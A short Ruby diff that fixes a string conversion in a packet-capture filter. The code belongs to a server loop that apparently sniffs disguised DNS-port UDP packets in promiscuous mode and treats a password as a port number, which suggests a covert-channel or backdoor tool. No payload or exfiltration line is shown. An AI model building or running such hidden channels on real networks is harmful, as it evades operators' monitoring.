@@ -36,7 +36,7 @@ class Server
   def start
   puts "starting server loop"
   conn = Connector.new(@iface, @tos, @daddr, @pass, "server", @port)
-  filter = "udp and dst port " + $cliPass + " and src port 53"
+  filter = "udp and dst port " + $cliPass.to_s + " and src port 53"
   cap = Capture.new(:iface => @iface, :start => true, :promisc => true, :filter => filter)
   cap.stream.each do |p|
     puts "Client packet verified and recieved"
